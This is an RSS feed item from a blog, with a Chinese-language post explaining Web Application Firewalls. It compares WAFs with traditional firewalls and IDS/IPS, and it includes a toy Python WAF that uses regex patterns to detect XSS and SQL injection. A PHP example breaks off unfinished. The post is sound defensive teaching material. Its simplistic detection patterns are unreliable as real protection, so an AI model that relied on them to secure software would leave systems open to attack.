<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Hexo</title>
        <link>http://example.com</link>
        <description></description>
        <language>en</language>
        <pubDate>Fri, 07 Jun 2024 00:12:45 +0800</pubDate>
        <lastBuildDate>Fri, 07 Jun 2024 00:12:45 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://example.com/2024/06/07/WAF/</guid>
            <title>WAF</title>
            <link>http://example.com/2024/06/07/WAF/</link>
            <pubDate>Fri, 07 Jun 2024 00:12:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;waf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#waf&#34;&gt;#&lt;/a&gt; WAF&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;WAF&lt;/code&gt; （ &lt;code&gt;Web Application Firewall&lt;/code&gt; ，网页应用防火墙）是一种专门设计用于保护 Web 应用程序的安全设备或软件，旨在通过监控、过滤和分析 HTTP/HTTPS 流量，防止常见的 Web 攻击，如 SQL 注入、跨站脚本（XSS）攻击和跨站请求伪造（CSRF）等&lt;/p&gt;
&lt;p&gt;WAF 一般部署在 Web 服务器之前，用来保护 Web 应用&lt;/p&gt;
&lt;h2 id=&#34;waf与传统安全设备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#waf与传统安全设备&#34;&gt;#&lt;/a&gt; WAF 与传统安全设备&lt;/h2&gt;
&lt;p&gt;传统安全设备特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;IPS：针对蠕虫、网络病毒、后门木马防护，不具备 WEB 应用层的安全防护能力&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;传统 FW：作为内网与外网之间的一种访问控制设备，提供 3-4 层的安全防护能力，不具备 WEB 应用层的安全防护能力&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;UTM/NGFW: 优势，UTM 或者 NGFW 把多种安全能力融合为一体（上网行为管理、IPS、防病毒、WEB 安全防护）&lt;/p&gt;
&lt;p&gt;劣势：各安全引擎模式开启之后设备综合性能势必降低！&lt;/p&gt;
&lt;p&gt;n 多核架构 / MIPS 架构无法实现对 HTTP/HTTPS 数据包的深度检测（包括转换编码、拼接攻击语句、大小写变换、超大报文等），WEB 应用攻击的检出率低、漏报率高！&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;来自chatgpt对于waf与传统安全设备的区别的回答&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#来自chatgpt对于waf与传统安全设备的区别的回答&#34;&gt;#&lt;/a&gt; 来自 ChatGPT 对于 WAF 与传统安全设备的区别的回答：&lt;/h2&gt;
&lt;h3 id=&#34;1-保护对象&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-保护对象&#34;&gt;#&lt;/a&gt; 1. &lt;strong&gt;保护对象&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WAF&lt;/strong&gt;：专门保护 Web 应用程序，主要针对 HTTP/HTTPS 流量和应用层攻击，如 SQL 注入、跨站脚本（XSS）、跨站请求伪造（CSRF）等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;传统防火墙&lt;/strong&gt;：主要保护网络边界，控制网络层的流量，防止未授权访问和攻击，针对 IP、端口、协议等进行过滤。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IDS/IPS&lt;/strong&gt;：监控和分析网络流量以检测和阻止各种网络攻击和异常行为，保护整个网络环境。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-工作层面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-工作层面&#34;&gt;#&lt;/a&gt; 2. &lt;strong&gt;工作层面&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202406070038139.png&#34; alt=&#34;OSI七层网络协议 | Clei&#39;s Blog&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WAF&lt;/strong&gt;：工作在应用层（OSI 模型的第 7 层），深入分析 Web 请求和响应，理解 HTTP/HTTPS 协议和 Web 应用逻辑。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;传统防火墙&lt;/strong&gt;：工作在网络层（第 3 层）和传输层（第 4 层），关注 IP 地址、端口号和传输协议。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IDS/IPS&lt;/strong&gt;：通常工作在网络层和传输层，有时也涉及应用层，但主要用于广泛的网络流量监控和防护。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-检测和防护方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-检测和防护方法&#34;&gt;#&lt;/a&gt; 3. &lt;strong&gt;检测和防护方法&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WAF&lt;/strong&gt;：使用签名检测、行为分析、规则引擎、学习模式等方法，针对 Web 特有的攻击进行深度检查和防护。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;传统防火墙&lt;/strong&gt;：使用基于状态的包过滤、访问控制列表（ACL）、NAT 等方法，控制和管理进出网络的流量。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IDS/IPS&lt;/strong&gt;：使用签名检测、异常检测、协议分析等方法，检测并响应各种网络攻击，如 DDoS、端口扫描、恶意流量等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-部署位置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-部署位置&#34;&gt;#&lt;/a&gt; 4. &lt;strong&gt;部署位置&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WAF&lt;/strong&gt;：通常部署在 Web 服务器前端，保护特定的 Web 应用程序或 Web 服务器。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;传统防火墙&lt;/strong&gt;：部署在网络边界，如企业网络和互联网之间，保护整个网络的进出口。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IDS/IPS&lt;/strong&gt;：可以部署在网络的不同位置，如网络边界、内部网络段之间，或者靠近关键资源，监控并保护整个网络环境。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-功能和用途&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-功能和用途&#34;&gt;#&lt;/a&gt; 5. &lt;strong&gt;功能和用途&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WAF：
&lt;ul&gt;
&lt;li&gt;防护 Web 应用层攻击&lt;/li&gt;
&lt;li&gt;HTTP/HTTPS 流量分析和过滤&lt;/li&gt;
&lt;li&gt;Web 应用安全策略管理&lt;/li&gt;
&lt;li&gt;输入验证和输出编码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;传统防火墙：
&lt;ul&gt;
&lt;li&gt;网络访问控制和流量过滤&lt;/li&gt;
&lt;li&gt;VPN 支持和流量加密&lt;/li&gt;
&lt;li&gt;基于状态的包过滤&lt;/li&gt;
&lt;li&gt;防止未授权访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IDS/IPS：
&lt;ul&gt;
&lt;li&gt;实时监控和检测网络攻击&lt;/li&gt;
&lt;li&gt;自动响应和阻止攻击（IPS）&lt;/li&gt;
&lt;li&gt;网络行为分析和异常检测&lt;/li&gt;
&lt;li&gt;事件日志记录和报告&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6-具体防护场景&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-具体防护场景&#34;&gt;#&lt;/a&gt; 6. &lt;strong&gt;具体防护场景&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WAF&lt;/strong&gt;：保护在线购物网站、Web 服务 API、内容管理系统（CMS）等 Web 应用程序，防止 Web 特有的攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;传统防火墙&lt;/strong&gt;：保护企业网络边界，控制内部网络和外部网络之间的流量，防止未经授权的访问和外部攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IDS/IPS&lt;/strong&gt;：监控整个网络的流量，检测和阻止各种类型的攻击，保护网络中的所有设备和服务。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7-优势和劣势&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-优势和劣势&#34;&gt;#&lt;/a&gt; 7. &lt;strong&gt;优势和劣势&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WAF：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;优势&lt;/strong&gt;：深度保护 Web 应用程序，针对 Web 特有攻击提供精细化防护。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;劣势&lt;/strong&gt;：只能保护 Web 应用，对非 HTTP/HTTPS 流量无效。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;传统防火墙：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;优势&lt;/strong&gt;：提供广泛的网络层和传输层保护，易于部署和管理。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;劣势&lt;/strong&gt;：无法深入检查和理解应用层流量，难以防御复杂的应用层攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IDS/IPS：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;优势&lt;/strong&gt;：实时检测和响应各种网络攻击，保护整个网络环境。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;劣势&lt;/strong&gt;：可能产生误报和漏报，配置和管理复杂。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;waf的工作原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#waf的工作原理&#34;&gt;#&lt;/a&gt; WAF 的工作原理&lt;/h2&gt;
&lt;h3 id=&#34;1-流量过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-流量过滤&#34;&gt;#&lt;/a&gt; 1. &lt;strong&gt;流量过滤&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;WAF 通过拦截并检查所有进入和离开 Web 服务器的 HTTP/HTTPS 流量，确保只有合法和安全的请求能够到达应用程序。这包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;请求过滤&lt;/strong&gt;：检查每个请求的 URL、头信息、参数和正文内容。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;响应过滤&lt;/strong&gt;：检查服务器返回的响应内容，防止敏感信息泄露。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-签名检测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-签名检测&#34;&gt;#&lt;/a&gt; 2. &lt;strong&gt;签名检测&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;WAF 使用预定义的攻击签名库来识别已知的攻击模式。当请求或响应匹配这些签名时，WAF 会采取相应的措施，如阻止请求、记录事件或向管理员发送警报。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;例子&lt;/strong&gt;：SQL 注入签名、XSS 攻击签名。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-行为分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-行为分析&#34;&gt;#&lt;/a&gt; 3. &lt;strong&gt;行为分析&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;通过分析正常流量模式，WAF 可以建立基线并检测异常行为。这有助于识别零日攻击和其他未知威胁。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;例子&lt;/strong&gt;：如果某 IP 地址在短时间内发送了大量的请求，WAF 可以将其视为可能的攻击并阻止其进一步请求。可以防御 CC 攻击（但是无法完全防御 DDos 攻击）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-规则引擎&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-规则引擎&#34;&gt;#&lt;/a&gt; 4. &lt;strong&gt;规则引擎&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;管理员可以根据特定需求和安全策略定义自定义规则。WAF 会根据这些规则检测并响应特定类型的流量。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;例子&lt;/strong&gt;：阻止来自某些地理位置的请求、限制特定 IP 地址的访问频率。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-安全策略管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-安全策略管理&#34;&gt;#&lt;/a&gt; 5. &lt;strong&gt;安全策略管理&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;WAF 允许管理员定义和管理一系列安全策略，以适应不同的应用场景和需求。这些策略可以涵盖访问控制、输入验证、输出编码等方面。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;例子&lt;/strong&gt;：仅允许特定用户组访问某些敏感功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6-学习模式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-学习模式&#34;&gt;#&lt;/a&gt; 6. &lt;strong&gt;学习模式&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;许多现代 WAF 具备学习模式功能，能够自动学习和适应应用程序的正常行为，并动态调整防护策略以应对不断变化的威胁环境。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;例子&lt;/strong&gt;：通过分析用户行为，自动调整防护规则以减少误报和漏报。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7-日志记录与审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-日志记录与审计&#34;&gt;#&lt;/a&gt; 7. &lt;strong&gt;日志记录与审计&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;WAF 记录所有检测到的威胁和采取的响应措施，生成详细的日志和报告，帮助管理员进行分析、审计和改进安全策略。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;例子&lt;/strong&gt;：记录所有阻止的 SQL 注入尝试，并生成每周安全报告。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8-集成与自动化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8-集成与自动化&#34;&gt;#&lt;/a&gt; 8. &lt;strong&gt;集成与自动化&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;WAF 可以与其他安全设备和软件集成，如防火墙、入侵检测系统（IDS）、入侵防御系统（IPS）等，以形成综合的安全防护体系。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;例子&lt;/strong&gt;：当 WAF 检测到某个攻击行为时，自动通知 IPS 进行进一步处理。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;waf的工作流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#waf的工作流程&#34;&gt;#&lt;/a&gt; WAF 的工作流程&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;接收请求&lt;/strong&gt;：当用户向 Web 服务器发送 HTTP/HTTPS 请求时，WAF 首先接收该请求。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分析请求&lt;/strong&gt;：WAF 检查请求的各个部分，包括 URL、参数、头信息和正文内容，进行签名检测和行为分析。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应用策略&lt;/strong&gt;：根据预定义的安全策略和规则，决定如何处理该请求。可能的操作包括允许、阻止、记录或向管理员发送警报。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;转发请求&lt;/strong&gt;：如果请求被允许，WAF 将其转发到 Web 服务器进行处理。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;监控响应&lt;/strong&gt;：WAF 检查服务器返回的响应，确保没有敏感信息泄露或其他安全问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;返回响应&lt;/strong&gt;：最后，WAF 将安全的响应返回给用户。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;简单的自定义waf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#简单的自定义waf&#34;&gt;#&lt;/a&gt; 简单的自定义 WAF&lt;/h2&gt;
&lt;p&gt;编写代码来捕获和解析 HTTP/HTTPS 流量。可以使用以下库：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python:  &lt;code&gt;scapy&lt;/code&gt; ,  &lt;code&gt;dpkt&lt;/code&gt; ,  &lt;code&gt;http.server&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Node.js:  &lt;code&gt;http&lt;/code&gt; ,  &lt;code&gt;https&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;C/C++:  &lt;code&gt;libpcap&lt;/code&gt; ,  &lt;code&gt;libnetfilter_queue&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; http.server &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; BaseHTTPRequestHandler, HTTPServer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;SimpleWAF&lt;/span&gt;(&lt;span class=&#34;title class_ inherited__&#34;&gt;BaseHTTPRequestHandler&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;do_GET&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; self.is_malicious_request(self.path):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.send_response(&lt;span class=&#34;number&#34;&gt;403&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.end_headers()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.wfile.write(&lt;span class=&#34;string&#34;&gt;b&amp;quot;403 Forbidden&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.send_response(&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.end_headers()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.wfile.write(&lt;span class=&#34;string&#34;&gt;b&amp;quot;Hello, World!&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;is_malicious_request&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, path&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        patterns = [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            re.&lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;r&amp;quot;(&amp;lt;|%3C).*script.*(&amp;gt;|%3E)&amp;quot;&lt;/span&gt;, re.IGNORECASE),  &lt;span class=&#34;comment&#34;&gt;# XSS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            re.&lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;r&amp;quot;(\%27)|(\&amp;#x27;)|(\-\-)|(\%23)|(#)&amp;quot;&lt;/span&gt;, re.IGNORECASE),  &lt;span class=&#34;comment&#34;&gt;# SQL Injection&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; pattern &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; patterns:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; pattern.search(path):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server = HTTPServer((&lt;span class=&#34;string&#34;&gt;&amp;#x27;localhost&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;8080&lt;/span&gt;), SimpleWAF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Starting server at http://localhost:8080&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server.serve_forever()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 